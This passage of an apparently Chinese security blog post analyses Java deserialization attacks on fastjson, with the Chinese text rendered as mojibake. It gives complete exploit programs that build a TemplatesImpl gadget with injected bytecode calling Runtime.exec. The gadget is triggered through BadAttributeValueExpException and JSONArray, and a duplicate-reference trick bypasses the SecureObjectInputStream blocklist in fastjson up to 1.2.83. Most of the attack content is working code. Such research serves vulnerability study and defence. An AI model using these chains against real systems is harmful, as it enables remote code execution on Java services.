class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111336619.png" alt="image-20241011133609518"></p><p>fastjson2åˆ©ç”¨</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111341193.png" alt="image-20241011134159108"></p><p>JSONObjectçš„åˆ©ç”¨ä¹Ÿä¸€æ ·ï¼Œå°±ä¸å†å†™ä¸€éäº†</p><h1 id="ä¸ºä»€ä¹ˆfastjson1249ä»¥åä¸å†èƒ½åˆ©ç”¨"><a href="#ä¸ºä»€ä¹ˆfastjson1-2-49ä»¥åä¸å†èƒ½åˆ©ç”¨" class="headerlink" title="ä¸ºä»€ä¹ˆfastjson1.2.49ä»¥åä¸å†èƒ½åˆ©ç”¨"></a>ä¸ºä»€ä¹ˆfastjson1.2.49ä»¥åä¸å†èƒ½åˆ©ç”¨</h1><p>å› ä¸ºä»1.2.49å¼€å§‹ï¼ŒJSONArrayä»¥åŠJSONObjectæ–¹æ³•å¼€å§‹æœ‰äº†è‡ªå·±çš„readObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410111346927.png" alt="image-20241011134629872"></p><p>åœ¨å…¶<code>SecureObjectInputStream</code>ç±»å½“ä¸­é‡å†™äº†<code>resolveClass</code>,åœ¨å…¶ä¸­è°ƒç”¨äº†<code>checkAutoType</code>æ–¹æ³•åšç±»çš„æ£€æŸ¥</p><p><img src="https://cdn.clown2024.cn/202410111350600.png" alt="image-20241011135009543"></p><p>æ‰€ä»¥åé¢å°±æ˜¯æˆ‘ä»¬å¦‚ä½•è¿›è¡Œç»•è¿‡çš„é—®é¢˜äº†</p><h1 id="fastjson1249åç»•è¿‡"><a href="#fastjson1-2-49åç»•è¿‡" class="headerlink" title="fastjson1.2.49åç»•è¿‡"></a>fastjson1.2.49åç»•è¿‡</h1><p>ä»–æ£€æŸ¥çš„é€»è¾‘æ˜¯è¿™æ ·çš„ï¼Œå½“è°ƒç”¨JSONArray&#x2F;JSONObjectçš„Objectæ–¹æ³•è§¦å‘ååºåˆ—åŒ–æ—¶ï¼Œå°†è¿™ä¸ªååºåˆ—åŒ–è¿‡ç¨‹å§”æ‰˜ç»™<code>SecureObjectInputStream</code>å¤„ç†æ—¶ï¼Œè§¦å‘resolveClasså®ç°å¯¹æ¶æ„ç±»çš„æ‹¦æˆª</p><p>çœ‹èµ·æ¥å¾ˆæ­£å¸¸ï¼Œä½†å®é™…ä¸Šä»–çš„ååºåˆ—åŒ–çš„é€»è¾‘æ˜¯ä¸å®‰å…¨ï¼Œä»–æ˜¯ä¸å®‰å…¨çš„ObjectInputStreamå¥—ä¸ªå®‰å…¨çš„SecureObjectInputStreamå¯¼è‡´äº†ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectInputStream -&gt; readObject<br>xxxxxx(çœç•¥ä¸­é—´è¿‡ç¨‹)<br>SecureObjectInputStream -&gt; readObject -&gt; resolveClass<br></code></pre></td></tr></table></figure><p><strong>å®‰å…¨çš„ååºåˆ—åŒ–å†™æ³•</strong></p><p>æˆ‘ä»¬æ­£å¸¸çš„å®‰å…¨ååºåˆ—åŒ–å†™æ³•åº”è¯¥æ˜¯è¿™æ ·çš„ï¼Œç”Ÿæˆä¸€ä¸ªç»§æ‰¿ObjectInputStreamçš„ç±»å¹¶é‡å†™resolveClass(å‡å®šä¸ºTestInputStream)ï¼Œç”±å®ƒæ¥åšååºåˆ—åŒ–çš„å…¥å£ï¼Œè¿™æ ·æ‰æ˜¯å®‰å…¨çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TestInputStream -&gt; readObject -&gt; resolveClass<br></code></pre></td></tr></table></figure><p><strong>å¦‚ä½•ç»•è¿‡</strong></p><p>é‚£æˆ‘ä»¬çš„ç»•è¿‡æ€è·¯å°±æ˜¯å¦‚æœåœ¨ä¸­é—´çš„ç©ºæ¡£æœŸåšä¸€äº›æ‰‹è„šï¼Œè®©ä»–ä¸è¿›å…¥åˆ°resolveClassé‡Œé¢</p><p>å…³é”®åœ¨ObjectInputStream#readObject0é‡Œé¢ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410111558059.png" alt="image-20241011155830987"></p><p>ä»–ä¼šæ ¹æ®è¯»åˆ°çš„bytesä¸­tcçš„æ•°æ®ç±»å‹åšä¸åŒçš„å¤„ç†å»æ¢å¤éƒ¨åˆ†å¯¹è±¡</p><p>åœ¨ä¸åŒçš„caseä¸­ï¼Œå¤§éƒ¨åˆ†ç±»éƒ½ä¼šæœ€ç»ˆè°ƒç”¨<code>readClassDesc</code>å»è·å–ç±»çš„æè¿°ç¬¦ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¦‚æœå½“å‰ååºåˆ—åŒ–æ•°æ®ä¸‹ä¸€ä½ä»ç„¶æ˜¯<code>TC_CLASSDESC</code>é‚£ä¹ˆå°±ä¼šåœ¨<code>readNonProxyDesc</code>ä¸­è§¦å‘<code>resolveClass</code></p><p><img src="https://cdn.clown2024.cn/202410111611096.png" alt="image-20241011161140045"></p><p><img src="https://cdn.clown2024.cn/202410111611784.png" alt="image-20241011161152724"></p><p>ç„¶ååˆ†æ”¯ä¸­ï¼Œä¸ä¼šè°ƒç”¨<code>readClassDesc</code>çš„åˆ†æ”¯æœ‰<code>TC_NULL</code>ã€<code>TC_REFERENCE</code>ã€<code>TC_STRING</code>ã€<code>TC_LONGSTRING</code>ã€<code>TC_EXCEPTION</code>ï¼Œstringä¸nullè¿™ç§å¯¹æˆ‘ä»¬æ¯«æ— ç”¨å¤„çš„ï¼Œexceptionç±»å‹åˆ™æ˜¯è§£å†³åºåˆ—åŒ–ç»ˆæ­¢ç›¸å…³ä¹Ÿæ²¡ä»€ä¹ˆç”¨ï¼Œé‚£ä¹ˆå°±åªå‰©ä¸‹Referenceå¼•ç”¨ç±»å‹äº†ã€‚</p><h2 id="å¼•ç”¨ç±»å‹åˆ©ç”¨"><a href="#å¼•ç”¨ç±»å‹åˆ©ç”¨" class="headerlink" title="å¼•ç”¨ç±»å‹åˆ©ç”¨"></a>å¼•ç”¨ç±»å‹åˆ©ç”¨</h2><p>æˆ‘ä»¬éœ€è¦åœ¨JSONArray&#x2F;JSONObjectå¯¹è±¡ååºåˆ—åŒ–æ¢å¤å¯¹è±¡æ—¶ï¼Œè®©æˆ‘ä»¬çš„æ¶æ„ç±»æˆä¸ºå¼•ç”¨ç±»å‹ä»è€Œç»•è¿‡resolveClassçš„æ£€æŸ¥</p><p>æ–¹æ³•å°±æ˜¯å‘Listã€setã€mapç±»å‹ä¸­æ·»åŠ åŒæ ·å¯¹è±¡æ—¶å³å¯æˆåŠŸåˆ©ç”¨</p><p><strong>åŸç†åˆ†æ</strong></p><p>åˆ†æä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(templates);<br>        arrayList.add(templates);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(arrayList);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å†™å…¥å¯¹è±¡çš„æ—¶å€™ä¼šèµ°åˆ°writeObject0è¿™ä¸ªæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410111631619.png" alt="image-20241011163106557"></p><p>è¿™é‡Œçš„æ³¨é‡Šç¿»è¯‘ä¸€ä¸‹å°±æ˜¯å¤„ç†ä»¥å‰å†™å…¥ä¸”ä¸å¯æ›¿æ¢çš„å¯¹è±¡</p><p>ç„¶åèµ°åˆ°ArrayList#writeObject</p><p><img src="https://cdn.clown2024.cn/202410111641589.png" alt="image-20241011164111537"></p><p>ç„¶åè·Ÿè¿›å»</p><p><img src="https://cdn.clown2024.cn/202410111641984.png" alt="image-20241011164143924"></p><p>è¿™æ¬¡ä¼ çš„æ˜¯TemplatesImplç±»ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡å†™çš„æ—¶å€™ä»–ä¼šåœ¨handleså“ˆå¸Œè¡¨ä¸­å»ºç«‹æ˜ å°„</p><p>å½“æˆ‘ä»¬å†æ¬¡å†™å…¥çš„æ—¶å€™ï¼Œä»–åœ¨æŸ¥è¯¢çš„æ—¶å€™å°±ä¸ä¼šè¿”å›-1</p><p><img src="https://cdn.clown2024.cn/202410111646059.png" alt="image-20241011164654999"></p><p>ç„¶åå°±å¯ä»¥è¿›å…¥åˆ°writeHandleæ–¹æ³•é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410111647745.png" alt="image-20241011164743700"></p><p>å¯ä»¥çœ‹åˆ°ä»–å°†é‡å¤å¯¹è±¡ä»¥å¼•ç”¨ç±»å‹å†™å…¥ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»•è¿‡resolveClassçš„æ£€æŸ¥äº†</p><h2 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ -1" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h2><p>æ–‡ç« çš„ç®€å•åˆ©ç”¨ä»£ç æ€è·¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TemplatesImpl templates = TemplatesImplUtil.getEvilClass(&quot;clac&quot;);<br>ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();<br>arrayList.add(templates);<br><br>JSONArray jsonArray = new JSONArray();<br>jsonArray.add(templates);<br><br>BadAttributeValueExpException bd = getBadAttributeValueExpException(jsonArray);<br>arrayList.add(bd);<br>  <br>WriteObjects(arrayList);<br></code></pre></td></tr></table></figure><p>æ–‡ç« çš„æ€è·¯è§£é‡Šï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">åºåˆ—åŒ–æ—¶ï¼Œåœ¨è¿™é‡Œtemplateså…ˆåŠ å…¥åˆ°arrayListä¸­ï¼Œåé¢åœ¨JSONArrayä¸­å†æ¬¡åºåˆ—åŒ–TemplatesImplæ—¶ï¼Œç”±äºåœ¨handlesè¿™ä¸ªhashè¡¨ä¸­æŸ¥åˆ°äº†æ˜ å°„ï¼Œåç»­åˆ™ä¼šä»¥å¼•ç”¨å½¢å¼è¾“å‡º<br><br>ååºåˆ—åŒ–æ—¶ArrayListå…ˆé€šè¿‡readObjectæ¢å¤TemplatesImplå¯¹è±¡ï¼Œä¹‹åæ¢å¤BadAttributeValueExpExceptionå¯¹è±¡ï¼Œåœ¨æ¢å¤è¿‡ç¨‹ä¸­ï¼Œç”±äºBadAttributeValueExpExceptionè¦æ¢å¤valå¯¹åº”çš„JSONArray/JSONObjectå¯¹è±¡ï¼Œä¼šè§¦å‘JSONArray/JSONObjectçš„readObjectæ–¹æ³•ï¼Œå°†è¿™ä¸ªè¿‡ç¨‹å§”æ‰˜ç»™SecureObjectInputStreamï¼Œåœ¨æ¢å¤JSONArray/JSONObjectä¸­çš„TemplatesImplå¯¹è±¡æ—¶ï¼Œç”±äºæ­¤æ—¶çš„ç¬¬äºŒä¸ªTemplatesImplå¯¹è±¡æ˜¯å¼•ç”¨ç±»å‹ï¼Œé€šè¿‡readHandleæ¢å¤å¯¹è±¡çš„é€”ä¸­ä¸ä¼šè§¦å‘resolveClassï¼Œç”±æ­¤å®ç°äº†ç»•è¿‡<br><br>Setã€Mapç±»å‹ä¹Ÿæ˜¯è¿™æ ·çš„ç»•è¿‡<br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±å¯ä»¥å†™expäº†ï¼Œæ”¹æˆfastjson1.2.83ç‰ˆæœ¬æ¥æ‰“</p><p>ArrayListçš„ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(templates);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br><br>        arrayList.add(val);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(arrayList);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111703825.png" alt="image-20241011170336723"></p><blockquote><p>è¿™é‡Œä¸€å¼€å§‹æˆ‘è‡ªå·±å†™ç›´æ¥ç®€å•ç²—æš´arrayliståŠ äº†ä¸¤æ¬¡ï¼Œç„¶åæŠŠarraylistæ”¾JSONArrayé‡Œï¼Œå¯¼è‡´æ‰“ä¸é€šï¼Œåæ¥ä¸€æƒ³éƒ½æ”¾é‡Œé¢çš„è¯æœ‰ä¸€ä¸ªä¼šä¸æ˜¯å¼•ç”¨ç±»å‹ï¼Œå¯¼è‡´ä»–ç»è¿‡resolveClassä¹‹åä¼šæå‰æŠ›å‡ºå¼‚å¸¸ï¼Œæ‰€ä»¥æˆ‘ä»¬æ— è®ºæ˜¯Listè¿˜æ˜¯Mapï¼Œéƒ½æ˜¯è¦åŒ…è£¹åœ¨å¤–é¢çš„ï¼Œä½¿å…¶ç¬¬ä¸€ä¸ªç±»ååºåˆ—åŒ–çš„æ—¶å€™ä¸ç»è¿‡resolveClass</p></blockquote><p>æ–‡ç« çš„HashMapçš„ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> 